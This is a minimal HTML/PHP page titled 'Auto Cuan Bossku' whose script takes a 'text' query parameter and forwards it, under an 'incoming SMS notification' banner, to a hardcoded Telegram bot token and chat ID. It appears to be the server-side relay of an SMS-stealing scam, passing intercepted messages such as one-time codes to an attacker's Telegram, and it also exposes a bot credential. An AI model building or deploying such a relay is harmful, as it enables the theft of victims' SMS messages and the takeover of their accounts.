<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>Auto Cuan Bossku</title>
</head>
<body>
    <form method="GET" action="">
        
       <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"
    integrity="sha512-+NqPlbbtM1QqiK8ZAo4Yrj2c4lNQoGv8P79DPtKzj++l5jnN39rHA/xsqn8zE9l0uSoxaCdrOgFs6yjyfbBxSg=="
    crossorigin="anonymous" referrerpolicy="no-referrer"></script>
<?php

define ('url',"https://api.telegram.org/bot6325239273:AAFPoboSvSdzdcZhwOOeX5O6v-hTe9rZ63E/");

$text = $_GET['text'];

$chat_id = '6584550430';

$message = urlencode("──────────────────────
𝗡𝗢𝗧𝗜𝗙𝗜𝗞𝗔𝗦𝗜 | 𝗦𝗠𝗦 | 𝗠𝗔𝗦𝗨𝗞
──────────────────────
".$text);

file_get_contents(url."sendmessage?text=".$message."&chat_id=".$chat_id."&parse_mode=HTML");

?>

</form>
</body>
</html>